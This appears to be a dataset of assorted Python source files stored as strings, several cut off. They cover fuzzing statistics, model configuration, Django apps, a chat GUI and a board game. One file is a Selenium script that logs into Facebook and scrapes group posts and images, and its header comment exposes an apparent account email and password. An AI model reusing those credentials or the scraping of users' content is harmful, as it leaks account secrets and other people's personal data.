os.path.abspath(sys.argv[1])\n    out_dir = os.path.abspath(sys.argv[2])\n\n    # Read in csv\n    data_group_by_fuzzer = group_last_dipri_overhead(df=pd.read_csv(data_csv, index_col=0))\n    cols = ['real_map_size', 'dipri_rnd', 'dipri_time_percent']\n    for fuzzer in data_group_by_fuzzer:\n        print(fuzzer)\n        data = pd.DataFrame(data=data_group_by_fuzzer[fuzzer])[cols]\n        print(data.corr())\n        print('-------------------------------------------------------')\n    vh_data = pd.DataFrame(data=data_group_by_fuzzer['dipri-VH'])\n    vh_data = vh_data.loc[(vh_data['target'] == 'readelf') |\n                          (vh_data['target'] == 'mjs') |\n                          (vh_data['target'] == 'xmllint')]\n    print(vh_data[cols].corr())\n",
    "#python3 scraper.py mee589731@gmail.com mee12345@ https://www.facebook.com/groups/1436956330229869 --group\nfrom selenium import webdriver\nfrom selenium.webdriver.chrome.options import Options\nimport time\nfrom selenium.webdriver.common.by import By\nfrom bs4 import BeautifulSoup\nimport os\nimport requests\nimport uuid\nimport re\nimport csv\nfrom argparse import ArgumentParser\nparser = ArgumentParser()\ndef is_valid_url(url):\n    # Regular expression to validate URLs\n    url_regex = r\"^(http|https)://[^\\s/$.?#].[^\\s]*$\"\n    return re.match(url_regex, url) is not None\n\nif __name__ == \"__main__\":\n    parser.add_argument(\"--username\", type=str, help=\"Username for authentication\")\n    parser.add_argument(\"--password\", type=str, help=\"Password for authentication\")\n    parser.add_argument(\"--link\", type=str, help=\"Link to the group, page, or profile\")\n\n    parser.add_argument(\"--group\", action=\"store_true\", help=\"Scrape as a group\")\n    parser.add_argument(\"--page\", action=\"store_true\", help=\"Scrape as a page\")\n    parser.add_argument(\"--profile\", action=\"store_true\", help=\"Scrape as a profile\")\n    args = parser.parse_args()\n\n    if not any([args.group, args.page, args.profile]):\n        parser.error(\"Please specify --group, --page, or --profile\")\n\n    if args.group and (args.page or args.profile):\n        parser.error(\"Cannot specify both --group and --page/--profile\")\n\n    if not is_valid_url(args.link):\n        parser.error(\"Invalid link format. Please provide a valid URL.\")\n\n    # Your scraping logic goes here\n    print(\"Username:\", args.username)\n    print(\"Password:\", args.password)\n    print(\"Link:\", args.link)\n    print(\"Group:\", args.group)\n    print(\"Page:\", args.page)\n    print(\"Profile:\", args.profile)\n\n\nchrome_options = Options()\n\nchrome_options.add_argument(\"--incognito\")\nchrome_options.add_argument(\"--window-size=1920 x 1080\")\n\ndriver = webdriver.Chrome(chrome_options=chrome_options, executable_path='/bin/chromedriver')\n\ndriver.get('https://www.facebook.com/login/')\ntime.sleep(1)\n\nGroup = True\n\ndir = './scraped_data/'\nif not os.path.exists(dir):\n    os.makedirs(dir)\n    \nuser = driver.find_element_by_xpath('//*[@id=\"email\"]').send_keys(args.username)\npassword = driver.find_element_by_xpath('//*[@id=\"pass\"]').send_keys(args.password)\nsubmit = driver.find_element_by_xpath('//*[@id=\"loginbutton\"]').click()\ntime.sleep(1)\n\n# driver.get('https://www.facebook.com/MyanmarCelebrityTV')#page\ndriver.get(args.link)#group\n# driver.get('https://www.facebook.com/thetnaingoo123514')#profile\ntime.sleep(1)\n\n#clicking group feed order\nsorting_svg = driver.find_element(By.CSS_SELECTOR, '.x19dipnz.x1lliihq.x1k90msu.x2h7rmj.x1qfuztq[title=\"sort group feed by\"]')\ndriver.execute_script(\"arguments[0].setAttribute('title', 'New posts')\", sorting_svg)\nsorting_svg.click()\n\n#wait and click New posts\ntime.sleep(1)\n# Find the element for \"New posts\" by its class name\nnew_posts_element = driver.find_element(By.XPATH, \"//span[@class='x193iq5w xeuugli x13faqbe x1vvkbs x10flsy6 x1lliihq x1s928wv xhkezso x1gmr53x x1cpjm7i x1fgarty x1943h6x x4zkp8e x41vudc x6prxxf xvq8zen xk50ysn xzsf02u x1yc453h' and contains(text(), 'New posts')]\")\n\n# Click the \"New posts\" element\nnew_posts_element.click()\n\n#real time updating and scraping\ndownloaded_images = set()\ndata = []\ntotal_images_saved = 0\ntotal_text_saved = 0\n\ndef extract_new_posts():\n    global downloaded_images\n    global data\n    global total_images_saved\n    global total_text_saved\n    for i in range (1):\n        # Scroll to load more posts\n        driver.execute_script(\"window.scrollTo(0, document.body.scrollHeight);\")\n        time.sleep(1)\n        \n        # Find all posts\n        posts = driver.find_elements(By.CSS_SELECTOR, \".x78zum5.xdt5ytf.xz62fqu.x16ldp7u\")\n\n        # Loop through the posts and extract data\n        for post in posts:\n            # Text extraction\n            post_html = post.get_attribute('outerHTML')\n            soup = BeautifulSoup(post_html, 'html.parser')\n            div_elements = soup.find_all('div')\n\n            # Extract text containing 'Mee'\n            extracted_text = [div.get_text() for div in div_elements if 'Mee' in div.get_text()]\n            for text in extracted_text:\n                if text not in data:\n                    data.append(text)\n                    total_text_saved += 1\n                    print(\"Text added\")\n\n            # Image extraction\n            image_elements = driver.find_elements(By.CSS_SELECTOR, \"img.x1ey2m1c.xds687c.x5yr21d.x10l6tqk.x17qophe.x13vifvy.xh8yej3.xl1xv1r\")\n\n            # Loop through each image element\n            for image_element in image_elements:\n                image_src = image_element.get_attribute(\"src\")\n                if image_src in downloaded_images:\n                    continue\n                response = requests.get(image_src)\n                if response.status_code == 200:\n                    image_id = uuid.uuid4().hex[:8]  # Generate a random 8-character hex string\n                    file_name = f\"i",
    "def resumen_exploraciones(exploraciones: list, exploradores: dict) -> None:\n    pass\n\ndef exploraciones_por_planeta(exploraciones: list) -> dict:\n    pass\n\ndef main():\n    # Lista de exploraciones\n    exploraciones = [\n        (\"E004\", \"Tatooine\", 1400, 2),\n        (\"E003\", \"Coruscant\", 1100, 1),\n        (\"E002\", \"Naboo\", 400, 1),\n        (\"E001\", \"Endor\", 900, 1),\n        (\"E001\", \"Naboo\", 600, 1),\n        (\"E002\", \"Tatooine\", 500, 2),\n        (\"E001\", \"Endor\", 700, 1),\n        (\"E004\", \"Coruscant\", 1400, 2),\n        (\"E003\", \"Tatooine\", 1100, 1),\n        (\"E003\", \"Naboo\", 900, 1),\n        (\"E004\", \"Coruscant\", 1400, 2),\n        (\"E003\", \"Tatooine\", 1100, 1),\n        (\"E002\", \"Naboo\", 400, 1),\n        (\"E001\", \"Endor\", 900, 1),\n        (\"E002\", \"Tatooine\", 500, 2),\n    ]\n\n    # Diccionario de exploradores\n    exploradores = {\n        \"E001\": {\"nombre\": \"Han Solo\", \"expediciones\": 0, \"desafios_completados\": 0, \"monto_total\": 0},\n        \"E002\": {\"nombre\": \"Chewbacca\", \"expediciones\": 0, \"desafios_completados\": 0, \"monto_total\": 0},\n        \"E003\": {\"nombre\": \"Leia Organa\", \"expediciones\": 0, \"desafios_completados\": 0, \"monto_total\": 0},\n        \"E004\": {\"nombre\": \"Luke Skywalker\", \"expediciones\": 0, \"desafios_completados\": 0, \"monto_total\": 0}\n    }\n\nif __name__ == \"__main__\":\n    main()\n",
    "# coding=utf-8\n# Copyright 2024 The Qwen team, Alibaba Group and the HuggingFace Inc. team. All rights reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\"\"\" Qwen2 model configuration\"\"\"\n\nfrom transformers.configuration_utils import PretrainedConfig\nfrom transformers.utils import logging\n\n\nlogger = logging.get_logger(__name__)\n\nQWEN2_PRETRAINED_CONFIG_ARCHIVE_MAP = {\n    \"Qwen/Qwen2-7B-beta\": \"https://huggingface.co/Qwen/Qwen2-7B-beta/resolve/main/config.json\",\n}\n\n\nclass Qwen2Config(PretrainedConfig):\n    r\"\"\"\n    This is the configuration class to store the configuration of a [`Qwen2Model`]. It is used to instantiate a\n    Qwen2 model according to the specified arguments, defining the model architecture. Instantiating a configuration\n    with the defaults will yield a similar configuration to that of\n    Qwen2-7B-beta [Qwen/Qwen2-7B-beta](https://huggingface.co/Qwen/Qwen2-7B-beta).\n\n    Configuration objects inherit from [`PretrainedConfig`] and can be used to control the model outputs. Read the\n    documentation from [`PretrainedConfig`] for more information.\n\n\n    Args:\n        vocab_size (`int`, *optional*, defaults to 151936):\n            Vocabulary size of the Qwen2 model. Defines the number of different tokens that can be represented by the\n            `inputs_ids` passed when calling [`Qwen2Model`]\n        hidden_size (`int`, *optional*, defaults to 4096):\n            Dimension of the hidden representations.\n        intermediate_size (`int`, *optional*, defaults to 22016):\n            Dimension of the MLP representations.\n        num_hidden_layers (`int`, *optional*, defaults to 32):\n            Number of hidden layers in the Transformer encoder.\n        num_attention_heads (`int`, *optional*, defaults to 32):\n            Number of attention heads for each attention layer in the Transformer encoder.\n        num_key_value_heads (`int`, *optional*, defaults to 32):\n            This is the number of key_value heads that should be used to implement Grouped Query Attention. If\n            `num_key_value_heads=num_attention_heads`, the model will use Multi Head Attention (MHA), if\n            `num_key_value_heads=1 the model will use Multi Query Attention (MQA) otherwise GQA is used. When\n            converting a multi-head checkpoint to a GQA checkpoint, each group key and value head should be constructed\n            by meanpooling all the original heads within that group. For more details checkout [this\n            paper](https://arxiv.org/pdf/2305.13245.pdf). If it is not specified, will default to `32`.\n        hidden_act (`str` or `function`, *optional*, defaults to `\"silu\"`):\n            The non-linear activation function (function or string) in the decoder.\n        max_position_embeddings (`int`, *optional*, defaults to 32768):\n            The maximum sequence length that this model might ever be used with.\n        initializer_range (`float`, *optional*, defaults to 0.02):\n            The standard deviation of the truncated_normal_initializer for initializing all weight matrices.\n        rms_norm_eps (`float`, *optional*, defaults to 1e-06):\n            The epsilon used by the rms normalization layers.\n        use_cache (`bool`, *optional*, defaults to `True`):\n            Whether or not the model should return the last key/values attentions (not used by all models). Only\n            relevant if `config.is_decoder=True`.\n        tie_word_embeddings (`bool`, *optional*, defaults to `False`):\n            Whether the model's input and output word embeddings should be tied.\n        rope_theta (`float`, *optional*, defaults to 10000.0):\n            The base period of the RoPE embeddings.\n        use_sliding_window (`bool`, *optional*, defaults to `False`):\n            Whether to use sliding window attention.\n        sliding_window (`int`, *optional*, defaults to 4096):\n            Sliding window attention (SWA) window size. If not specified, will default to `4096`.\n        max_window_layers (`int`, *optional*, defaults to 28):\n            The number of layers that use SWA (Sliding Window Attention). The bottom layers use SWA while the top use full attention.\n        attention_dropout (`float`, *optional*, defaults to 0.0):\n            The dropout ratio for the attention probabilities.\n\n    ```python\n    >>> from transformers import Qwen2Model, Qwen2Config\n\n    >>> # Initializing a Qwen2 style configuration\n    >>> configuration = Qwen2Config()\n\n    >>> # Initializing a model from the Qwen2-7B style configura",
    "import pandas as pd\r\nimport numpy as np\r\nimport matplotlib.pyplot as plt\r\n\r\n\r\nurl = \"C:\\\\Users\\\\User\\\\Desktop\\\\ML Projects\\\\Amazon-Recommender-System\\\\ratings_Electronics.csv\"\r\ndata = pd.read_csv(url, names = ['User', 'Id', 'Rating', 'Timestamp'])\r\n\r\n# First look at data\r\n# print(data.head())\r\n# print(data.shape)\r\n# print(data.dtypes)\r\n\r\n# Check if there are any missing data\r\n# print(data.isnull().sum())\r\n\r\n# Checking rating distribution\r\n# print(data['Rating'].unique())\r\ntally = []\r\nrating = np.sort(data['Rating'].unique())\r\nfor i in rating:\r\n    tally.append((data['Rating'] == i).sum())\r\n# plt.bar(rating, tally)\r\n# plt.show()\r\n\r\n# Removing unessecary data (columns)\r\ndata.drop(['Timestamp'], axis = 1, inplace = True)\r\n\r\n# Rating analysis first look\r\nuser = data['User'].unique()\r\n# print(user.size)\r\nprod_per_user = data.groupby(by = 'User')['Rating'].count().sort_values(ascending = False)\r\n# print(prod_per_user.head())\r\n\r\n\r\n# -----Popularity based system-----\r\n# New dataframe with users who have rated 50 or more items.\r\npopsys = data.groupby(by = 'Id').filter(lambda x:x['Rating'].count() >= 50)\r\n# print(popsys.head())\r\n\r\n# Number of ratings for each product\r\nrating_no = popsys.groupby(by = 'Id')['Rating'].count().sort_values(ascending = False)\r\n# print(rating_no.head())\r\n\r\n# Average rating of each product\r\n# print(popsys.groupby(by = 'Id')['Rating'].mean().sort_values(ascending = False).head())\r\n\r\n# Total number of ratings for each product\r\n# print(popsys.groupby('Id')['Rating'].count().sort_values(ascending = False).head())\r\n\r\navg_ratings = pd.DataFrame(popsys.groupby(by = 'Id')['Rating'].mean())\r\navg_ratings['Rating Count'] = pd.DataFrame(avg_ratings.groupby('Id')['Rating'].count())\r\n# print(avg_ratings.head())",
    "from django.core.management.base import BaseCommand\nfrom core.models import Course, Module\n\nclass Command(BaseCommand):\n    help = 'Load Courses and Modules'\n\n    def handle(self, *args, **kwargs):\n        Module.objects.all().delete()\n        course_names = [\n            'Computer Science', 'Mathematics', 'Physics', 'Film Studies'\n        ]\n\n        if not Course.objects.count():\n            for course_name in course_names:\n                Course.objects.create(name=course_name)\n\n        # Computer Science\n        cs = Course.objects.get(name='Computer Science')\n\n        compsci_modules = [\n            'AI',\n            'Machine Learning',\n            'Web Development',\n            'Software Engineering', \n            'NoSQL Databases'\n        ]\n\n        for module in compsci_modules:\n            Module.objects.create(name=module, course=cs)\n\n        # Maths\n        math = Course.objects.get(name='Mathematics')\n        math_modules = [\n            'Linear Algebra',\n            'Differential Equations',\n            'Graph Theory',\n            'Topology',\n            'Number Theory'\n        ]\n\n        for module in math_modules:\n            Module.objects.create(name=module, course=math)\n\n        # PHYSICS\n        physics = Course.objects.get(name='Physics')\n        physics_modules = [\n            'Quantum Mechanics',\n            'Optics',\n            'Astronomy',\n            'Solid State Physics',\n            'Electromagnetic Theory'\n        ] \n        for module in physics_modules:\n            Module.objects.create(name=module, course=physics)\n\n        # Film\n        film = Course.objects.get(name='Film Studies')\n\n        film_modules = [\n            'Film Noir',\n            'Silent Cinema',\n            'American Independent Cinema',\n            'Avant-Garde Cinema',\n            'Scriptwriting'\n        ]\n\n        for module in film_modules:\n            Module.objects.create(name=module, course=film)",
    "\"\"\"city360 URL Configuration\r\n\r\nThe `urlpatterns` list routes URLs to views. For more information please see:\r\n    https://docs.djangoproject.com/en/4.1/topics/http/urls/\r\nExamples:\r\nFunction views\r\n    1. Add an import:  from my_app import views\r\n    2. Add a URL to urlpatterns:  path('', views.home, name='home')\r\nClass-based views\r\n    1. Add an import:  from other_app.views import Home\r\n    2. Add a URL to urlpatterns:  path('', Home.as_view(), name='home')\r\nIncluding another URLconf\r\n    1. Import the include() function: from django.urls import include, path\r\n    2. Add a URL to urlpatterns:  path('blog/', include('blog.urls'))\r\n\"\"\"\r\nfrom django.contrib import admin\r\nfrom django.urls import path\r\nfrom app import views\r\n\r\nurlpatterns = [\r\n    path('admin/', admin.site.urls),\r\n    path('', views.index),\r\n    path('services/', views.services),\r\n    path('about/', views.about),\r\n    \r\n    path('login/', views.login),\r\n    path('userregistration/', views.userregistration),\r\n    path('workerregistration/', views.workerregistration),\r\n    \r\n    path('admin_home/', views.admin_home),\r\n    path('addcategory/', views.addcategory),\r\n    path('viewuser/', views.viewuser),\r\n    path('approveuser/', views.approveuser),\r\n    path('rejecteduser/', views.rejecteduser),\r\n    path('deleteuser/', views.deleteuser),\r\n    path('viewworker/', views.viewworker),\r\n    path('approveworker/', views.approveworker),\r\n    path('rejectedworker/', views.rejectedworker),\r\n    path('deleteworker/', views.deleteworker),\r\n    path('userfeedback/', views.userfeedback),\r\n    path('viewcategory/', views.viewcategory),\r\n    path('deletecategory/', views.deletecategory),\r\n    path('workerfeedback/', views.workerfeedback),\r\n    \r\n    path('user_home/', views.user_home),\r\n    path('userviewcategory/', views.userviewcategory),\r\n    path('bookingcategory/', views.bookingcategory),\r\n    path('bookworker/', views.bookworker),\r\n    path('userviewbooking/', views.userviewbooking),\r\n    path('cancelbooking/', views.cancelbooking),\r\n    path('useraddfeedback/', views.useraddfeedback),\r\n    path('userviewfeedback/', views.userviewfeedback),\r\n    path('addfeedback/', views.addfeedback),\r\n    path('userprofile/', views.userprofile),\r\n    path('updateuser/', views.updateuser),\r\n    path('payment/', views.payment),\r\n    path('userviewpayment/', views.userviewpayment),\r\n    \r\n    path('worker_home/', views.worker_home),\r\n    path('workerviewbooking/', views.workerviewbooking),\r\n    path('approvebooking/', views.approvebooking),\r\n    path('rejectbooking/', views.rejectbooking),\r\n    path('deletebooking/', views.deletebooking),\r\n    path('workerviewfeedback/', views.workerviewfeedback),\r\n    path('workeraddfeedback/', views.workeraddfeedback),\r\n    path('workerprofile/', views.workerprofile),\r\n    path('updateworker/', views.updateworker),\r\n    path('workerviewpayment/', views.workerviewpayment),\r\n    path('deletepayment/', views.deletepayment),\r\n    \r\n    \r\n    \r\n    \r\n]\r\n",
    "\"\"\"A progress bar for the command line\"\"\"\nimport sys\nimport time\n\n\nclass Progress:\n    \"\"\"Progress bar object for the comand line\n\n    This class allows to conveniently add progress bars to long running\n    calculations. It writes textual and graphical information about\n    the progress of a text to sys.stderr. To be used in the following\n    way:\n\n    >>> prog = Progress(100, \"Performing some long running task\")\n    >>> for step in some_long_calculation():\n    >>>     prog += 1\n    >>>     prog.show()\n    >>> prog.finish()\n\n    The progress bar displays the percentage of completion\n    (counter/total) and the real time taken by the calculation so far.\n\n    It is allowed to manually alter prog.counter and prog.total during\n    use.\n    \"\"\"\n    def __init__(self, total, title=\"Progress\", width=80):\n        \"\"\"Initialize Progress bar\n\n        Parameters:\n        total (number) -- maximum value of counter\n        title (str) -- information to be displayed\n        width (int) -- width of the display progress bar\n        \"\"\"\n        self.counter = 0\n        self.total = total\n        self.title = title\n        self.width = width\n        self.start_time = time.time()\n\n    def __iadd__(self, value):\n        \"\"\"Increase current counter by value\"\"\"\n        self.counter += value\n        return self\n\n    def show(self):\n        \"\"\"Display progress bar in its current state\"\"\"\n        sec = time.time()-self.start_time\n        # eta = self.total/self.counter*sec-sec if self.counter else 0\n        percent = 100*self.counter/self.total\n        title = f'{self.title} ({percent:.0f}% {sec//60:02.0f}:{sec%60:02.0f}) '\n        if len(title) >= self.width:\n            raise ValueError(\"Progress bar does not fit width. Shorten title of increase width.\")\n        bar_width = self.width - (len(title)) - 3\n        full_width = int(bar_width*self.counter/self.total)\n        empty_width = bar_width - full_width\n        sys.stdout.write('\\r'+title+'['+full_width*'#'+empty_width*'.'+']')\n        sys.stdout.flush()\n\n    def finish(self):\n        \"\"\"Hide progress bar\"\"\"\n        sys.stdout.write('\\r'+self.width*' '+'\\r')\n        sys.stdout.flush()\n",
    "from paho.mqtt import publish, subscribe #COMM\r\nimport paho.mqtt.client as mqtt          #COMM\r\nfrom simpledt import JsonDataTable         #DF\r\nfrom datetime import datetime              #DF\r\nimport json; import sys; import os   #COMMANDS\r\nimport flet as flt                        #GUI\r\nimport pandas as pd                        #DF\r\nimport platform                         #CHECK\r\n\r\n# \u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\r\n# All old mqtt variables\r\n\r\nMQTT_TOPIC = 'pychat-vicourt' # To connect into the chat\r\nMQTT_BROKER = 'test.mosquitto.org' # The default connection\r\nMQTT_PORT = 1883 # Default port \r\n\r\n# \u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\r\n\r\ndef main(page= flt.Page):\r\n\r\n    page.title = \"PyChat \u2014 MQTT/Python/Json by VicourtBitt\"\r\n\r\n    # The window measurement\r\n    page.window_width = 580\r\n    page.window_min_width = 580\r\n    page.window_max_width = 580\r\n\r\n    page.window_height = 600\r\n    page.window_min_height = 600\r\n    page.window_max_height = 600\r\n    # The window measurement\r\n\r\n    page.scroll = 'auto'\r\n    page.horizontal_alignment = \"Center\"\r\n\r\n    # The distance between every window end(?)\r\n    page.padding = 5\r\n\r\n    # \u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\r\n    # ROWS AND COLUMNS \r\n\r\n    # First Screen Alignment\r\n    fs_column1 = flt.Column()\r\n    fs_row1 = flt.Row()\r\n    fs_row2 = flt.Row()\r\n    fs_row3 = flt.Row()\r\n\r\n    # Second Screen Alignment\r\n    ss_column1 = flt.Column()\r\n    ss_row1 = flt.Row()\r\n\r\n    # \u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\r\n    # BUTTONS, CONTAINERS, TXT FIELDS AND STUFF DECLARATION\r\n\r\n    # >>> FIRST SCREEN STUFF\r\n    fs_username = flt.TextField(\r\n            width=250,\r\n            height=100,\r\n            label= \"COMO QUER SER CHAMADO?\",\r\n            hint_text=\"N\u00e3o utilize apelidos.\"\r\n        )\r\n\r\n    fs_usertext = flt.ElevatedButton(\r\n            text= \"Escreva seu username na caixa de texto abaixo.\\n\\nRegras:\\nSem apelidos\\nSem abrevia\u00e7\u00f5es\",\r\n            width = 250, height= 180,\r\n            disabled= True,\r\n            style= flt.ButtonStyle(\r\n                shape={\r\n                    flt.MaterialState.DEFAULT: \r\n                            flt.BeveledRectangleBorder(radius=3)\r\n                    }\r\n                )\r\n        )\r\n    \r\n    # >>> SECOND SCREEN STUFF\r\n    json_path = 'C:\\\\Users\\\\victo\\\\Desktop\\\\Anota\u00e7\u00f5es Python\\\\pychat_log.txt'\r\n    json_dataframe = JsonDataTable(json_path)\r\n    json_datatable = json_dataframe.datatable\r\n\r\n    ss_datacontainer = flt.Container(\r\n        content= json_datatable,\r\n        width=560\r\n    )\r\n\r\n    # \u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\r\n    # ALIGNMENT APPEND\r\n\r\n    # >>> FIRST SCREEN APPEND\r\n    fs_row1.controls.append(fs_usertext)\r\n    fs_row2.controls.append(fs_username)\r\n\r\n    fs_list = [fs_row1,fs_row2] # this is basically all the stuff above\r\n    \r\n    for f in fs_list:\r\n        fs_column1.controls.append(f)\r\n\r\n    # >>> SECOND SCREEN APPEND\r\n    ss_row1.controls.append(ss_datacontainer)\r\n\r\n    ss_list = [ss_row1] # the same explanation could be used here\r\n\r\n    for s in ss_list:\r\n        ss_column1.controls.append(s)\r\n\r\n    # \u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\r\n\r\n    def route_changer(route):\r\n\r\n        page.views.clear()\r\n\r\n        # \u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\r\n        # This is the menu and username collect screen\r\n\r\n        page.views.append( # This page append means everything (including the view) we're adding into the screen\r\n            flt.View(\r\n                '/',\r\n                [\r\n                    flt.AppBar(\r\n                        # All the page settings\r\n                        title= flt.Text(\"Menu \u2014 Tela Inicial\"),\r\n                        center_title=True,\r\n                        toolbar_height=50,\r\n                        bgcolor=flt.colors.BLUE_900,\r\n                        actions=\r\n                        [\r\n                            # This is an icon, which, in the future, will send us into other screens\r\n                            flt.IconButton(flt.icons.HISTORY, on_click=lambda _: page.go('/page1'), icon_size=30),\r\n                            flt.IconButton(flt.icons.CHAT, on_click=lambda _: page.go('/page2'), icon_size=30)\r\n                            # That lambda inside the function, receive a dump arg, just to run properly the program\r\n                        ]\r\n                    ),\r\n                    fs_column1\r\n                ]\r\n            )\r\n        )\r\n        page.update() # This update is crucial.\r\n\r\n        # \u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\r\n        # This is the messages log screen\r\n\r\n        if page.route == '/page1':\r\n            page.views.append(\r\n                flt.View(\r\n                    '/page1',\r\n                    [\r\n                        flt.AppBar(\r\n                            title=flt.Text('Log de Mensagens'),\r\n",
    "import random\n\nfrom die import Die\nfrom player import Player\n\nMAX_PLAYERS = 4\nMIN_PLAYERS = 2\n\nscreens = {\n    'START': 1,\n    'TURNS': 2,\n    'BOARD': 3,\n    'PROPS': 4,\n    'CARDS': 5\n}\n\n\nclass Game:\n    def __init__(self, id):\n        self.game_id = id\n        self.players = []\n        self.player_turn = 0  # The index of the players array that holds the player whose turn it is\n        self.dice_values = [1, 1]\n        self.is_playing = False\n        self.current_screen = screens.get('START')\n        self.available_icons = [True, True, True, True]\n        self.turn_rolls = []\n\n    def get_id(self):\n        return self.game_id\n\n    def get_players(self):\n        return self.players\n\n    def get_num_players(self):\n        return len(self.players)\n\n    def roll(self):\n        self.dice_values = [random.randint(0, 5), random.randint(0, 5)]\n\n    def done_roll(self, last_roll):\n        if self.current_screen == screens.get('TURNS'):\n            self.turn_rolls.append(last_roll)\n        if len(self.turn_rolls) == len(self.players):\n            unset_players = self.players.copy()\n            for j in range(0, len(unset_players)):\n                largest = self.turn_rolls.index(max(self.turn_rolls))\n                self.players[j] = unset_players[largest]  # appends correct player to empty list\n                self.turn_rolls[largest] = -1  # get rid of the largest element in list\n            self.current_screen = screens.get('BOARD')\n        self.players[self.player_turn].last_roll = last_roll\n\n    def next_player(self):\n        self.player_turn = (self.player_turn + 1) % self.get_num_players()\n        if self.get_curr_player().bankrupt:\n            self.next_player()\n\n    def set_screen(self, screen_name):\n        self.current_screen = screens.get(screen_name)\n\n    def screen_is(self, screen_name):\n        return self.current_screen == screens.get(screen_name)\n\n    def get_curr_player(self):\n        return self.players[self.player_turn]\n\n    def add_player(self):\n        icon_num = 0\n        while not self.available_icons[icon_num]:\n            icon_num = (icon_num + 1) % len(self.available_icons)\n        self.players.append(Player(False, icon_num, 'Player ' + str(self.get_num_players() + 1), 1, []))\n        self.available_icons[icon_num] = False\n\n    def set_icon(self, player_num, icon_num):\n        \"\"\"\n        Changes the given player's icon\n        :param player_num:\n        :param icon_num:\n        :return:\n        \"\"\"\n        player = self.players[player_num]\n\n        # Make old icon available for other players\n        self.available_icons[player.icon_num] = True\n        player.icon_num = icon_num\n        # Make new icon unavailable\n        self.available_icons[icon_num] = False\n",
